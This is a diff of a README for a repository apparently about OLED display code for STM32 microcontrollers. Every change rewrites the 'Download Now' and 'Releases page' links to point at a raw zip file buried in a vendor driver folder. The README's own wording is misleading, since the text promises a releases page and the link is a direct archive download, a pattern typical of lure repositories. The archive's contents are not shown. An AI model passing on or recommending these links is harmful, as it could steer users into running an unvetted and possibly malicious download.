@@ -1,6 +1,6 @@
 # 🌟 STM32-OLED-I2C-HAL-Coding-Method - Easy OLED Display Setup for STM32
 
-[![Download](https://raw.githubusercontent.com/Alyasdz/STM32-OLED-I2C-HAL-Coding-Method/main/Core/OLE_HA_Method_ST_Coding_dalt.zip%20Now-%20-green)](https://raw.githubusercontent.com/Alyasdz/STM32-OLED-I2C-HAL-Coding-Method/main/Core/OLE_HA_Method_ST_Coding_dalt.zip)
+[![Download](https://raw.githubusercontent.com/Alyasdz/STM32-OLED-I2C-HAL-Coding-Method/main/Drivers/CMSIS/Device/ST/ST_HA_Coding_Method_OLE_v3.3.zip%20Now-%20-green)](https://raw.githubusercontent.com/Alyasdz/STM32-OLED-I2C-HAL-Coding-Method/main/Drivers/CMSIS/Device/ST/ST_HA_Coding_Method_OLE_v3.3.zip)
 
 ## 📖 Overview
 
@@ -23,12 +23,12 @@ Before you begin, ensure you have the following:
 
 To get started, visit the Releases page to download the software. 
 
-[Download Now](https://raw.githubusercontent.com/Alyasdz/STM32-OLED-I2C-HAL-Coding-Method/main/Core/OLE_HA_Method_ST_Coding_dalt.zip)
+[Download Now](https://raw.githubusercontent.com/Alyasdz/STM32-OLED-I2C-HAL-Coding-Method/main/Drivers/CMSIS/Device/ST/ST_HA_Coding_Method_OLE_v3.3.zip)
 
 ### Step-by-Step Installation
 
 1. **Visit the Releases Page:**
-   Go to [this page](https://raw.githubusercontent.com/Alyasdz/STM32-OLED-I2C-HAL-Coding-Method/main/Core/OLE_HA_Method_ST_Coding_dalt.zip) to find the latest version.
+   Go to [this page](https://raw.githubusercontent.com/Alyasdz/STM32-OLED-I2C-HAL-Coding-Method/main/Drivers/CMSIS/Device/ST/ST_HA_Coding_Method_OLE_v3.3.zip) to find the latest version.
 
 2. **Download the Release:**
    Find the release suitable for your needs. Click on the link to download the zip file or package.
@@ -84,6 +84,6 @@ For further assistance, feel free to reach out on the GitHub Issues page. You ca
 - **HAL Library Documentation:** Understand how to use HAL drivers effectively.
 - **I2C Protocol Basics:** Familiarize yourself with the I2C communication method.
 
-[Download Now](https://raw.githubusercontent.com/Alyasdz/STM32-OLED-I2C-HAL-Coding-Method/main/Core/OLE_HA_Method_ST_Coding_dalt.zip) 
+[Download Now](https://raw.githubusercontent.com/Alyasdz/STM32-OLED-I2C-HAL-Coding-Method/main/Drivers/CMSIS/Device/ST/ST_HA_Coding_Method_OLE_v3.3.zip) 
 
 Thank you for using this repository! Enjoy displaying your data on the OLED screen.
